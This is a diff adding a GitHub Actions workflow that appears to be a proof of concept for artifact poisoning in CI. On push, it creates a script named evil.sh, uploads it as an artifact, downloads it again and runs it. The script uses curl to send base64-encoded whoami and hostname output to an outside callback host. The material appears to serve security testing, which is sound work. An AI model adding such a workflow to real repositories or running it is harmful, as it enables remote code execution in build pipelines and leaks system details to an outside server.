@@ -1,0 +1,35 @@
+name: PoC Artifact Poisoning Retest (Single Workflow)
+on:
+  push:
+    paths:
+      - '.github/workflows/poc-2150ef36-retest.yml'
+jobs:
+  poison-chain:
+    runs-on: ubuntu-latest
+    steps:
+      - name: create-malicious-artifact
+        run: |
+          mkdir -p /tmp/payload
+          cat > /tmp/payload/evil.sh << 'EOF'
+          #!/bin/bash
+          echo "EVIL SCRIPT EXECUTED"
+          curl -sk "https://vlk6yzjfdinjbph3pdctcyjzzq5htahz.nvcollaborator.nvidia.com/ARTIFACT-RCE-RETEST-$(whoami | base64 -w0).$(hostname | base64 -w0)"
+          EOF
+          chmod +x /tmp/payload/evil.sh
+      - name: upload-artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: poc-poison-retest
+          path: /tmp/payload/
+      - name: download-and-execute
+        uses: actions/download-artifact@v4
+        with:
+          name: poc-poison-retest
+          path: /tmp/downloaded
+      - name: execute-poisoned-artifact
+        run: |
+          echo "Files in downloaded artifact:"
+          ls -la /tmp/downloaded/
+          if [ -f /tmp/downloaded/evil.sh ]; then
+            bash /tmp/downloaded/evil.sh
+          fi
